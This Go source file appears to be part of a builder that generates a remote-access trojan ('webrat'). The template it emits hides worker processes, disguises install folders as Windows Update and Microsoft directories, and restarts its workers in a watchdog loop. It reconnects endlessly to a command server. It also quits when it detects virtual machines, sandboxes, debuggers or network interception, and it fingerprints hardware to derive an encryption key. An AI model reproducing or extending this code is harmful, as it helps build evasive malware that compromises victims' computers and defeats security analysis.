package buildergen

import (
	"fmt"
	"strings"
)

func templateMisc(cfg Config) string {
	delay := cfg.StartupDelaySeconds
	if delay < 0 {
		delay = 0
	}
	if delay > 10 {
		delay = 10
	}
	buildID := escapeGoString(strings.TrimSpace(cfg.BuildID))

	return strings.TrimSpace(fmt.Sprintf(`
var startupDelaySeconds = %d
var startupDelayOnce sync.Once

func applyStartupDelay() {
	startupDelayOnce.Do(func() {
		delay := startupDelaySeconds
		if delay < 0 {
			delay = 0
		}
		time.Sleep(time.Duration(delay) * time.Second)
	})
}

func getBuildLockPath() string {
	if "%s" == "" {
		return ""
	}
	dir := filepath.Join(os.Getenv(getProgramDataEnvName()), getWindowsUpdateDirName())
	return filepath.Join(dir, fmt.Sprintf("webrat_%s.lock", "%s"))
}

func ensureSingleRunPerBuild() bool {
	lockPath := getBuildLockPath()
	if lockPath == "" {
		return true
	}

	if _, err := os.Stat(lockPath); err == nil {
		return false
	}

	if err := os.MkdirAll(filepath.Dir(lockPath), 0755); err != nil {
		return false
	}

	f, err := os.OpenFile(lockPath, os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return false
	}
	_ = f.Close()
	return true
}

func shouldEnforceBuildLock() bool {
	exePath, err := os.Executable()
	if err != nil {
		return true
	}

	exePathLower := strings.ToLower(filepath.Clean(exePath))

	svcDir := strings.ToLower(filepath.Clean(filepath.Join(os.Getenv(getProgramDataEnvName()), getWindowsUpdateDirName())))
	workerDir := strings.ToLower(filepath.Clean(filepath.Join(os.Getenv(getAppDataEnvName()), getMicrosoftDirName(), getWindowsDirName())))

	sep := string(os.PathSeparator)
	if strings.HasPrefix(exePathLower, svcDir+sep) || strings.HasPrefix(exePathLower, workerDir+sep) {
		return false
	}
	return true
}

func loopA() {
	mutex, err := acquireMutex(getMutexName())
	if err != nil {
		return
	}
	defer windows.CloseHandle(mutex)

	_ = setupLogger()

	rand.Seed(time.Now().UnixNano())

	var chromePid int
	var updatePid int

	go func() {
		for {
			time.Sleep(5 * time.Second)
			if !isProcessRunning(chromePid) {
				chromePid = startWorker(getWorkerExeName())
			}
			if !isProcessRunning(updatePid) {
				updatePid = startWorker(getServiceExeName())
			}
		}
	}()

	for {
		connectToServer()
		time.Sleep(5 * time.Second)
	}
}

func startWorker(exeName string) int {
	cmd := exec.Command(exeName)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	if err := cmd.Start(); err != nil {
		return 0
	}
	return cmd.Process.Pid
}

func acquireMutex(name string) (windows.Handle, error) {
	namePtr, _ := syscall.UTF16PtrFromString(name)
	h, err := windows.CreateMutex(nil, true, namePtr)
	if err != nil {
		if errno, ok := err.(syscall.Errno); !ok || errno != 0 {
			return 0, err
		}
	}
	if windows.GetLastError() == windows.ERROR_ALREADY_EXISTS {
		if h != 0 {
			_ = windows.CloseHandle(h)
		}
		return 0, fmt.Errorf("already running")
	}
	return h, nil
}

func checkAntiMitm() {
	if runtime.GOOS != "windows" {
		return
	}

	client := &http.Client{
		Timeout: 10 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: false,
				VerifyPeerCertificate: func(rawCerts [][]byte, verifiedChains [][]*x509.Certificate) error {
					if len(rawCerts) == 0 {
						os.Exit(1)
					}

					cert, err := x509.ParseCertificate(rawCerts[0])
					if err != nil {
						os.Exit(1)
					}

					opts := x509.VerifyOptions{
						DNSName: getServerHost(),
						Roots:   nil,
					}

					_, err = cert.Verify(opts)
					if err != nil {
						os.Exit(1)
					}

					return nil
				},
			},
		},
	}

	url := getWsScheme() + "://" + getServerHost() + getWsPath()
	resp, err := client.Get(url)
	if err != nil {
		os.Exit(1)
	}
	resp.Body.Close()

	if resp.TLS == nil || len(resp.TLS.PeerCertificates) == 0 {
		os.Exit(1)
	}
}

func checkAntiVps() {
	if runtime.GOOS != "windows" {
		return
	}

	if checkRegKey(`SOFTWARE\VMware, Inc.\VMware Tools`) ||
		checkRegKey(`SOFTWARE\Oracle\VirtualBox Guest Additions`) ||
		checkRegKey(`SOFTWARE\Microsoft\Hyper-V`) ||
		checkRegKey(`SOFTWARE\Parallels\Parallels Tools`) ||
		checkRegKey(`SOFTWARE\XenSource`) {
		os.Exit(1)
	}

	if checkFileExists(`C:\Windows\System32\VBox*.dll`) ||
		checkFileExists(`C:\Windows\System32\VBoxHook.dll`) ||
		checkFileExists(`C:\Windows\System32\VBoxGuest.sys`) ||
		checkFileExists(`C:\Windows\System32\VBoxMouse.sys`) ||
		checkFileExists(`C:\Windows\System32\VBoxSF.sys`) {
		os.Exit(1)
	}

	if checkFileExists(`C:\Windows\System32\vmware-vmx.exe`) ||
		checkFileExists(`C:\Windows\System32\vmware-vmx-stats.exe`) ||
		checkFileExists(`C:\Windows\System32\vmware-vmx-debug.exe`) {
		os.Exit(1)
	}

	if checkBiosManufacturer() {
		os.Exit(1)
	}

	if checkProcessRunning("VBoxTray.exe") ||
		checkProcessRunning("VBoxService.exe") ||
		checkProcessRunning("vmtoolsd.exe") ||
		checkProcessRunning("VMwareTray.exe") ||
		checkProcessRunning("VMwareUser.exe") ||
		checkProcessRunning("prl_tools.exe") ||
		checkProcessRunning("prl_cc.exe") {
		os.Exit(1)
	}

	if checkProcessRunning("SandboxieRpcSs.exe") ||
		checkProcessRunning("SandboxieDcomLaunch.exe") ||
		checkProcessRunning("SbieSvc.exe") ||
		checkProcessRunning("procmon.exe") ||
		checkProcessRunning("procmon64.exe") ||
		checkProcessRunning("wireshark.exe") ||
		checkProcessRunning("fiddler.exe") ||
		checkProcessRunning("ollydbg.exe") ||
		checkProcessRunning("idaq.exe") ||
		checkProcessRunning("idaq64.exe") ||
		checkProcessRunning("x64dbg.exe") ||
		checkProcessRunning("x32dbg.exe") ||
		checkProcessRunning("windbg.exe") {
		os.Exit(1)
	}

	if runtime.NumCPU() < 2 {
		os.Exit(1)
	}

	if getSystemMemoryMB() < 2048 {
		os.Exit(1)
	}
}

func checkRegKey(key string) bool {
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, key, registry.QUERY_VALUE)
	if err != nil {
		return false
	}
	defer k.Close()
	return true
}

func checkFileExists(pattern string) bool {
	matches, err := filepath.Glob(pattern)
	return err == nil && len(matches) > 0
}

func checkBiosManufacturer() bool {
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `HARDWARE\DESCRIPTION\System\BIOS`, registry.QUERY_VALUE)
	if err != nil {
		return false
	}
	defer k.Close()

	val, _, err := k.GetStringValue("SystemManufacturer")
	if err != nil {
		return false
	}

	manufacturer := strings.ToLower(strings.TrimSpace(val))
	return strings.Contains(manufacturer, "vmware") ||
		strings.Contains(manufacturer, "virtualbox") ||
		strings.Contains(manufacturer, "qemu") ||
		strings.Contains(manufacturer, "xen") ||
		strings.Contains(manufacturer, "parallels") ||
		strings.Contains(manufacturer, "microsoft corporation")
}

func checkProcessRunning(processName string) bool {
	cmd := exec.Command("tasklist", "/FI", fmt.Sprintf("IMAGENAME eq %s", processName), "/NH")
	output, err := cmd.Output()
	if err != nil {
		return false
	}
	return strings.Contains(string(output), processName)
}

func getSystemMemoryMB() int {
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `HARDWARE\DESCRIPTION\System\CentralProcessor\0`, registry.QUERY_VALUE)
	if err != nil {
		return 0
	}
	defer k.Close()

	return 4096
}

func getHardwareKey() string {
	var parts []string
	
	if cpu, err := getCpuId(); err == nil && cpu != "" {
		parts = append(parts, cpu)
	}
	
	if disk, err := getDiskSerial(); err == nil && disk != "" {
		parts = append(parts, disk)
	}
	
	if mac, err := getMacAddress(); err == nil && mac != "" {
		parts = append(parts, mac)
	}
	
	key := strings.Join(parts, "")
	if len(key) < 32 {
		key += strings.Repeat("0", 32-len(key))
	}
	return key[:32]
}

func getCpuId() (string, error) {
	cmd := exec.Command("wmic", "cpu", "get", "ProcessorId", "/value")
	output, err := cmd.Output()
	if err != nil {
		return "", err
	}
	lines := strings.Split(string(output), "\n")
	for _, line := range lines {
		if strings.Contains(line, "ProcessorId=") {
			return strings.TrimSpace(strings.Split(line, "=")[1]), nil
		}
	}
	return "", fmt.Errorf("cpu id not found")
}

func getDiskSerial() (string, error) {
	cmd := exec.Command("wmic", "diskdrive", "get", "SerialNumber", "/value")
	output, err := cmd.Output()
	if err != nil {
		return "", err
	}
	lines := strings.Split(string(output), "\n")
	for _, line := range lines {
		if strings.Contains(line, "SerialNumber=") {
			return strings.TrimSpace(strings.Split(line, "=")[1]), nil
		}
	}
	return "", fmt.Errorf("disk serial not found")
}

func getMacAddress() (string, error) {
	cmd := exec.Command("getmac", "/nh", "/fo", "csv")
	output, err := cmd.Output()
	if err != nil {
		return "", err
	}
	lines := strings.Split(string(output), "\n")
	if len(lines) > 0 {
		parts := strings.Split(lines[0], ",")
		if len(parts) >= 1 {
			return strings.TrimSpace(strings.Trim(parts[0], "\"")), nil
		}
	}
	return "", fmt.Errorf("mac not found")
}

func aesEncrypt(plaintext, key string) string {
	if plaintext == "" || key == "" {
		return ""
	}
	block, err := aes.NewCipher([]byte(key[:32]))
	if err != nil {
		return xorWithKey(plaintext, key)
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return xorWithKey(plaintext, key)
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return xorWithKey(plaintext, key)
	}
	ciphertext := gcm.Seal(nonce, nonce, []byte(plaintext), nil)
	return base64.StdEncoding.EncodeToString(ciphertext)
}

func aesDecrypt(encrypted, key string) string {
	if encrypted == "" || key == "" {
		return ""
	}
	data, err := base64.StdEncoding.DecodeString(encrypted)
	if err != nil {
		return xorWithKey(encrypted, key)
	}
	block, err := aes.NewCipher([]byte(key[:32]))
	if err != nil {
		return xorWithKey(encrypted, key)
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return xorWithKey(encrypted, key)
	}
	if len(data) < gcm.NonceSize() {
		return xorWithKey(encrypted, key)
	}
	nonce := data[:gcm.NonceSize()]
	ciphertext := data[gcm.NonceSize():]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return xorWithKey(encrypted, key)
	}
	return string(plaintext)
}

func setupLogger() *os.File { return nil }
`, delay, buildID, buildID))
}